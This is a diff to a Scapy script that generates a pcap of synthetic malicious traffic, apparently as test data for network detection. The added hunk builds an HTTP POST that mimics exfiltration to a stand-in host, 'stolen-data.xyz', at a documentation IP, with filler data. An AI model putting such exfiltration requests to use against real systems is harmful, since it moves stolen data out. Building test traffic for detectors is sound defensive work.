@@ -28,5 +28,11 @@ for _ in range(5):
     pkt = IP(src="10.0.0.100", dst="203.0.113.10") / ICMP() / Raw(load=payload)
     packets.append(pkt)
 
+# HTTP POST to Suspicious TLD
+malicious_tld_ip = "198.51.100.22"
+http_payload = b"POST /upload HTTP/1.1\r\nHost: stolen-data.xyz\r\nContent-Length: 100\r\n\r\n" + (b"A" * 100)
+pkt = IP(src="10.0.0.100", dst=malicious_tld_ip) / TCP(sport=50000, dport=80, flags="PA") / Raw(load=http_payload)
+packets.append(pkt)
+
 wrpcap("malicious_traffic.pcap", packets)
 print(f"Generated malicious_traffic.pcap with {len(packets)} packets")
